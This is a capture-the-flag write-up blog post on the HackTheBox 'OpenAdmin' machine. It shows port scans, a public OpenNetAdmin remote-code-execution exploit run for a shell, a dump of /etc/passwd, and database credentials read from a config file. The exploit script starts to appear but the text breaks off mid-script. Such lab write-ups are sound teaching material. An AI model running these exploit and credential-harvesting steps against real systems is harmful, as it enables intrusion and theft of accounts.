<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/openadmin/openadmin.png alt="OpenAdmin HackTheBox Machine"><p>OpenAdmin - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network Enumeration</a></li><li><a href=#web-application-enumeration>Web Application Enumeration</a></li><li><a href=#web-application-exploitation>Web Application Exploitation</a></li><li><a href=#system-enumeration-and-exploration-in-the-jungle>System enumeration and exploration in the jungle</a></li><li><a href=#system-privilege-escalation--www-data-to-jimmy>System Privilege Escalation : www-data to jimmy</a></li><li><a href=#system-privilege-escalation--jimmy-to-joanna>System Privilege Escalation : jimmy to joanna</a></li><li><a href=#system-privilege-escalation--joanna-to-root>System Privilege Escalation : joanna to root</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> OpenAdmin</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/222>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><ul><li><strong>Network Enumeration</strong>: port 80, 22</li><li><strong>Web Application Enumeration</strong>: find <code>/ona/</code></li><li><strong>Web Application Exploitation</strong>: OpenNetAdmin RCE</li><li><strong>System enumeration and exploration in the jungle</strong>: mysql creds + 127.0.0.1:52846</li><li><strong>System Privilege Escalation : www-data to jimmy</strong>: credential stuffing</li><li><strong>System Privilege Escalation : jimmy to joanna</strong>: password crack</li><li><strong>System Privilege Escalation : joanna to root</strong>: nano escape</li></ul><h3 id=network-enumeration>Network Enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p><strong>TL;DR</strong>: port 80, 22</p><p>Let&rsquo;s begin by finding open ports with a SYN <a href=https://nmap.org/>nmap</a> scan and then trying
to run default scripts and finding the version of those services.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo nmap -p- -sS 10.10.10.171 -oA nmap_ports
</span></span><span class=line><span class=cl>[sudo] password for cyfun:
</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 10:45 CET
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.171
</span></span><span class=line><span class=cl>Host is up (0.025s latency).
</span></span><span class=line><span class=cl>Not shown: 65533 closed ports
</span></span><span class=line><span class=cl>PORT   STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp open  ssh
</span></span><span class=line><span class=cl>80/tcp open  http
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 31.23 seconds
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ sudo nmap -p 80,22 -sSCV 10.10.10.171 -oA nmap_services
</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 10:46 CET
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.171
</span></span><span class=line><span class=cl>Host is up (0.024s latency).
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
</span></span><span class=line><span class=cl>|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
</span></span><span class=line><span class=cl>|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds
</span></span></code></pre></td></tr></table></div></div><p>As often, only a web app.</p><h3 id=web-application-enumeration>Web Application Enumeration<a hidden class=anchor aria-hidden=true href=#web-application-enumeration>#</a></h3><p><strong>TL;DR</strong>: find <code>/ona/</code></p><p>With a web directory finder like <a href=https://github.com/maurosoria/dirsearch>dirsearch</a> or <a href=https://github.com/ffuf/ffuf>ffuf</a> and a
good wordlist, we can try to enumerate the possible sub-folders.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[14:04:59] 301 -  312B  - /music  -&gt;  http://10.10.10.171/music/
</span></span><span class=line><span class=cl>[14:05:01] 301 -  314B  - /artwork  -&gt;  http://10.10.10.171/artwork/
</span></span><span class=line><span class=cl>[14:05:04] 403 -  277B  - /server-status
</span></span><span class=line><span class=cl>[14:05:13] 301 -  313B  - /sierra  -&gt;  http://10.10.10.171/sierra/
</span></span></code></pre></td></tr></table></div></div><p>Many rabbit hole sub-directories but on http://10.10.10.171/music/ there is a
login button leading to http://10.10.10.171/ona/ where is hosted an
OpenNetAdmin v18.1.1 instance.</p><p>We can see an alert message telling there is a newer version available and that
we have version 18.1.1 of <strong>OpenNetAdmin</strong>.</p><h3 id=web-application-exploitation>Web Application Exploitation<a hidden class=anchor aria-hidden=true href=#web-application-exploitation>#</a></h3><p><strong>TL;DR</strong>: OpenNetAdmin RCE</p><p>With the <a href=https://www.archlinux.org/packages/community/any/exploitdb/>Exploit-DB</a> tool <code>searchsploit</code> we search if there are
available exploits.</p><p><code>searchsploit OpenNetAdmin</code> shows there is a RCE for 18.1.1.</p><p>Note: I got some error with the exploit that was due to the EOL char, I copied
the exploit and converted CRLF to LF.</p><p>We just have to give the login URL to the exploit to get a pseudo-shell.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>bash 47691.sh http://10.10.10.171/ona/login.php
</span></span><span class=line><span class=cl>$ id
</span></span><span class=line><span class=cl>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></code></pre></td></tr></table></div></div><h3 id=system-enumeration-and-exploration-in-the-jungle>System enumeration and exploration in the jungle<a hidden class=anchor aria-hidden=true href=#system-enumeration-and-exploration-in-the-jungle>#</a></h3><p><strong>TL;DR</strong>: mysql creds + 127.0.0.1:52846</p><p>Let&rsquo;s try some basic commands and see if we can find something juicy.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>pwd</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>ona</span><span class=o>/</span><span class=n>www</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>cat</span> <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>passwd</span>
</span></span><span class=line><span class=cl><span class=n>root</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>daemon</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=n>daemon</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>bin</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=n>sys</span><span class=p>:</span><span class=o>/</span><span class=n>dev</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sync</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>4</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>sync</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sync</span>
</span></span><span class=line><span class=cl><span class=n>games</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>5</span><span class=p>:</span><span class=mi>60</span><span class=p>:</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>man</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>6</span><span class=p>:</span><span class=mi>12</span><span class=p>:</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>cache</span><span class=o>/</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>lp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=n>lp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>lpd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>mail</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>news</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>uucp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>proxy</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=n>proxy</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>backup</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=n>backup</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>list</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=n>Mailing</span> <span class=n>List</span> <span class=n>Manager</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>list</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>irc</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>gnats</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=n>Gnats</span> <span class=n>Bug</span><span class=o>-</span><span class=n>Reporting</span> <span class=n>System</span> <span class=p>(</span><span class=n>admin</span><span class=p>):</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>gnats</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>nobody</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>nobody</span><span class=p>:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>network</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>100</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Network</span> <span class=n>Management</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=o>/</span><span class=n>netif</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>resolve</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>101</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Resolver</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=o>/</span><span class=n>resolve</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>syslog</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=mi>106</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>syslog</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>messagebus</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=mi>107</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>_apt</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>104</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>lxd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>105</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>lxd</span><span class=o>/</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>uuidd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>106</span><span class=p>:</span><span class=mi>110</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>uuidd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>dnsmasq</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>107</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>dnsmasq</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>misc</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>landscape</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>108</span><span class=p>:</span><span class=mi>112</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>landscape</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>pollinate</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>109</span><span class=p>:</span><span class=mi>1</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>cache</span><span class=o>/</span><span class=n>pollinate</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>sshd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>110</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>sshd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>jimmy</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=n>jimmy</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>jimmy</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>mysql</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>111</span><span class=p>:</span><span class=mi>114</span><span class=p>:</span><span class=n>MySQL</span> <span class=n>Server</span><span class=p>,,,:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>joanna</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1001</span><span class=p>:</span><span class=mi>1001</span><span class=p>:,,,:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>joanna</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>uname</span> <span class=o>-</span><span class=n>a</span>
</span></span><span class=line><span class=cl><span class=n>Linux</span> <span class=n>openadmin</span> <span class=mf>4.15</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>70</span><span class=o>-</span><span class=n>generic</span> <span class=c1>#79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span></code></pre></td></tr></table></div></div><p>At some point I ran <code>linpeas.sh</code> (from <a href=https://github.com/carlospolop/PEASS-ng>PEASS suite</a>) and found there was
not only <code>/opt/ona/www</code> related to OpenNetAdmin but also <code>/var/www/html/ona</code>.</p><p>In there are the database credentials.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=err>$</span> <span class=nx>cat</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nx>www</span><span class=o>/</span><span class=nx>html</span><span class=o>/</span><span class=nx>ona</span><span class=o>/</span><span class=nx>local</span><span class=o>/</span><span class=nx>config</span><span class=o>/</span><span class=nx>database_settings</span><span class=o>.</span><span class=nx>inc</span><span class=o>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$ona_contexts</span><span class=o>=</span><span class=k>array</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>  <span class=s1>&#39;DEFAULT&#39;</span> <span class=o>=&gt;</span>
</span></span><span class=line><span class=cl>  <span class=k>array</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;databases&#39;</span> <span class=o>=&gt;</span>
</span></span><span class=line><span class=cl>    <span class=k>array</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>      <span class=mi>0</span> <span class=o>=&gt;</span>
</span></span><span class=line><span class=cl>      <span class=k>array</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_type&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;mysqli&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_host&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;localhost&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_login&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;ona_sys&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_passwd&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;n1nj4W4rri0R!&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_database&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;ona_default&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_debug&#39;</span> <span class=o>=&gt;</span> <span class=k>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;description&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;Default data context&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;context_color&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;#D3DBFF&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>),</span>
</span></span><span class=line><span class=cl><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>At some point I got bored of the pseudo-shell via the RCE exploit so I decided
to get a meterpreter reverse shell. A better reason is that we can&rsquo;t use
interactive client such a mysql client from the RCE so we need a real shell.</p><p>The RCE exploit is pretty simple:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nv>URL</span><span class=o>=</span><span class=s2>&#34;</span><span class=si>${</span><span class=nv>1</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=k>while</span> true<span class=p>;</span><span class=k>do</span>
</span></span><span class=line><span class=cl> <span class=nb>echo</span> -n <span class=s2>&#34;</span>$<span class=s2> &#34;</span><span class=p>;</span> <span class=nb>read</span> cmd
